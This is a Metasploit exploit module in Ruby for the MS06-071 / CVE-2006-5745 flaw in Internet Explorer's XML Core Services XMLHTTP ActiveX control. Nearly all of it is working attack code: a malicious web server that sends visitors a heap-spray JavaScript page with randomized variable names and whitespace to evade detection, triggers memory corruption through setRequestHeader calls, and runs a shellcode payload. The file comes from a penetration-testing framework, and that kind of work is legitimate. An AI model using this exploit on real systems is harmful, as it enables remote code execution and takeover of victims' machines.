##
# $Id: ms06_071_xml_core.rb 9669 2010-07-03 03:13:45Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Internet Explorer XML Core Services HTTP Request Handling',
			'Description'    => %q{
					This module exploits a code execution vulnerability in Microsoft XML Core Services which
				exists in the XMLHTTP ActiveX control. This module is the modifed version of
				http://www.milw0rm.com/exploits/2743 - credit to str0ke. This module has been successfully
				tested on Windows 2000 SP4, Windows XP SP2, Windows 2003 Server SP0 with IE6
				+ Microsoft XML Core Services 4.0 SP2.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'Trirat Puttaraksa <trir00t [at] gmail.com>',
				],
			'Version'        => '$Revision: 9669 $',
			'References'     =>
				[
					['CVE',   '2006-5745' ],
					['OSVDB', '29425' ],
					['MSB',   'MS06-071' ],
					['BID',   '20915' ],
				],
			'Payload'        =>
				{
					'Space'          => 1024,
					'BadChars'       => "\x00",
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					['Windows 2000 SP4 -> Windows 2003 SP0', {'Ret' => 0x0c0c0c0c} ]
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Oct 10 2006'))
	end

	def on_request_uri(cli, request)

		# Re-generate the payload
		return if ((p = regenerate_payload(cli)) == nil)

		# Encode the shellcode
		shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))

		# Get a unicode friendly version of the return address
		addr_word  = [target.ret].pack('V').unpack('H*')[0][0,4]

		# Randomize the javascript variable names
		var_buffer    = rand_text_alpha(rand(30)+2)
		var_shellcode = rand_text_alpha(rand(30)+2)
		var_unescape  = rand_text_alpha(rand(30)+2)
		var_x         = rand_text_alpha(rand(30)+2)
		var_i         = rand_text_alpha(rand(30)+2)

		var_size      = rand_text_alpha(rand(30)+2)
		var_nopsize   = rand_text_alpha(rand(30)+2)
		var_limit     = rand_text_alpha(rand(30)+2)

		var_obj	      = rand_text_alpha(rand(30)+2)
		var_id	      = rand_text_alpha(rand(30)+2)


		# Build out the message
		content = %Q|
<html xmlns="http://www.w3.org/1999/xhtml">
<body>
<object id=#{var_id} classid="CLSID:{88d969c5-f192-11d4-a65f-0040963251e5}">
</object>
<script>

	var #{var_unescape}  = unescape ;
	var #{var_shellcode} = #{var_unescape}( "#{shellcode}" ) ;

	var #{var_size} = #{var_shellcode}.length * 2;
	var #{var_nopsize} = 0x400000 - (#{var_size} + 0x38);
	var #{var_buffer} = #{var_unescape}( "%u#{addr_word}" ) ;

	while (#{var_buffer}.length * 2 < #{var_nopsize}) #{var_buffer}+=#{var_buffer} ;

	#{var_limit} = (0x12000000 - 0x400000) / 0x400000;
	var #{var_x} = new Array() ;
	for ( var #{var_i} =0 ; #{var_i} < #{var_limit} ; #{var_i}++ ) {
		#{var_x}[ #{var_i} ] =
			#{var_buffer} + #{var_shellcode};
	}

	var #{var_obj} = null;
	#{var_obj} = document.getElementById('#{var_id}').object;

	try {
		#{var_obj}.open(new Array(), new Array(), new Array(), new Array(), new Array());
	} catch(e) {};

	#{var_obj}.open(new Object(), new Object(), new Object(), new Object(), new Object());

	#{var_obj}.setRequestHeader( new Object(), '......' );
	#{var_obj}.setRequestHeader( new Object(), 0x12345678 );
	#{var_obj}.setRequestHeader( new Object(), 0x12345678 );
	#{var_obj}.setRequestHeader( new Object(), 0x12345678 );
	#{var_obj}.setRequestHeader( new Object(), 0x12345678 );
	#{var_obj}.setRequestHeader( new Object(), 0x12345678 );
	#{var_obj}.setRequestHeader( new Object(), 0x12345678 );
	#{var_obj}.setRequestHeader( new Object(), 0x12345678 );
	#{var_obj}.setRequestHeader( new Object(), 0x12345678 );
	#{var_obj}.setRequestHeader( new Object(), 0x12345678 );
	#{var_obj}.setRequestHeader( new Object(), 0x12345678 );
	#{var_obj}.setRequestHeader( new Object(), 0x12345678 );

</script>
</body>
</html>
		|

		content = Rex::Text.randomize_space(content)

		print_status("Sending #{self.name} to #{cli.peerhost}:#{cli.peerport}...")

		# Transmit the response to the client
		send_response_html(cli, content)

		# Handle the payload
		handler(cli)
	end

end